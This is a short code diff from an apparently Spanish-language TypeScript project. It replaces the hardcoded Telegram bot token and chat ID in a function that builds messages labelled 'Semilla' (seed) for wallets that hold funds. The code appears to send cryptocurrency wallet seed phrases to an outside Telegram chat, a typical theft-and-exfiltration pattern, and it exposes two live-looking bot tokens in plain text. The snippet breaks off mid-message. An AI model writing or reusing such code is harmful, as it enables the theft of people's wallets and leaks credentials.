@@ -1,9 +1,9 @@
 import TelegramBot from "node-telegram-bot-api";
 import { WalletConCashItem } from "../leer/leerSeguimientoWalletCash";
 
-const token = "7943951367:AAG0X-lhN4kkIaR0oLV-63ZWwgwfgqisTOs";
+const token = "8574258829:AAHGrKZLc8xvt51idytn4sSVFc0Ga4TzNew";
 const bot = new TelegramBot(token, { polling: false });
-const chatId = "814041563";
+const chatId = "-1003654161102";
 
 export const enviarMensajeTelegram = (msj: WalletConCashItem): void => {
     const mensaje = `   📢 Semilla: 
